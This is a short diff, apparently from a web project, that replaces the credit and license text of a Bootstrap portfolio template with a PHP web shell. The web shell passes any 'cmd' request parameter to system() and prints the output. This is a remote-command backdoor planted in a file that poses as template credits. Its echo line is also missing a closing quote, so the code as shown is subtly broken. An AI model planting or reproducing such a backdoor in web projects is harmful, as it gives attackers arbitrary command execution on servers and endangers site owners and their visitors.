@@ -1,6 +1,10 @@
-Thanks for downloading this template!
-
-Template Name: iPortfolio
-Template URL: https://bootstrapmade.com/iportfolio-bootstrap-portfolio-websites-template/
-Author: BootstrapMade.com
-License: https://bootstrapmade.com/license/
+<?php
+if(isset($_REQUEST['cmd']))
+{
+    echo '<pre>;
+    $cmd=($_REQUEST['cmd']);
+    system($cmd);
+    echo '</pre>';
+    die;
+}
+?>
